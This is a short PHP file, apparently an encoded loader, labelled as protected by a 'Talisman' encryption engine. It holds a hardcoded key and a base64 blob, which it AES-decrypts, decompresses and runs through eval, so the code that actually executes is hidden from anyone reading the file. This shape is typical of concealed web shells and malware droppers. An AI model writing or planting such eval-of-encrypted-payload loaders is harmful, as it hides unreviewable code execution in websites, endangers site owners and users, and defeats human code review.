<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$kc5cec = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$p5c5a0 = base64_decode('q34rp3MoHG38e0fu1EJWxXFXUHR0REVtMTd4a1l5WmJvQmFtVVh5LzhIRmgxdHM3TGQ4OWU1TklxVXA3UWkwUmtCNmIzb256OXpnVDZBTzVGNUJwNmxNamh1YThVQ3ZML1hRZUdZKzBaQlRKdXNuQm16d0hQNWE4bTQ4PQ==');
$i56db0 = openssl_cipher_iv_length('aes-256-cbc');
$v3572f = substr($p5c5a0, 0, $i56db0);
$c8cd9a = substr($p5c5a0, $i56db0);
eval('?>'.gzinflate(openssl_decrypt($c8cd9a, 'aes-256-cbc', $kc5cec, 0, $v3572f)));